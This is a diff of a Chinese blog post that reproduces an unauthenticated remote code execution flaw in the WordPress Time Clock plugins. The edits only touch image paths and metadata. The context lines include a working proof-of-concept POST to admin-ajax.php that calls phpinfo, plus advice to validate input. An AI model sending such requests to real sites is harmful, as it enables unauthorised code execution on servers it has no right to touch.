@@ -13,14 +13,14 @@
 <meta property="og:site_name" content="Leo的随便写写">
 <meta property="og:description" content="漏洞介绍WordPress 的 Time Clock 插件和 Time Clock Pro 插件在 1.2.2 及以下版本（适用于 Time Clock）和 1.1.4 版本（适用于 Time Clock Pro）中存在通过“etimeclockwp_load_function_callback”函数执行远程代码的漏洞。这允许未经身份验证的攻击者在服务器上执行代码。无法指定调用函数的参数。 1.2">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/wp1.png">
-<meta property="og:image" content="http://example.com/images/wp2.png">
+<meta property="og:image" content="http://example.com/images/wp-timeclock-rce/wp1.png">
+<meta property="og:image" content="http://example.com/images/wp-timeclock-rce/wp2.png">
 <meta property="article:published_time" content="2024-11-20T12:40:22.000Z">
-<meta property="article:modified_time" content="2024-11-20T15:15:40.038Z">
+<meta property="article:modified_time" content="2024-11-20T15:18:45.441Z">
 <meta property="article:author" content="Leo">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/wp1.png">
+<meta name="twitter:image" content="http://example.com/images/wp-timeclock-rce/wp1.png">
   
     <link rel="alternate" href="/atom.xml" title="Leo的随便写写" type="application/atom+xml">
   
@@ -109,15 +109,15 @@
 <ul>
 <li>直接从用户输入（POST 参数）中获取函数名并调用可能存在安全风险。恶意用户可能尝试传入恶意的函数名来执行未经授权的操作或导致安全漏洞。应该对用户输入进行更严格的验证和过滤，以确保只允许特定的、安全的函数被调用。</li>
 </ul>
-<p><img src="/images/wp1.png" alt="代码"></p>
+<p><img src="/images/wp-timeclock-rce/wp1.png" alt="代码"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/2</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">function=phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/wp2.png" alt="执行效果"></p>
+<p><img src="/images/wp-timeclock-rce/wp2.png" alt="执行效果"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/11/20/wp-timeclock-rce/" data-id="cm3q10uqw000175nae5zldcet" data-title="wp_timeclock_rce" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/11/20/wp-timeclock-rce/" data-id="cm3q16h1p0003onna664o9bj7" data-title="wp_timeclock_rce" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
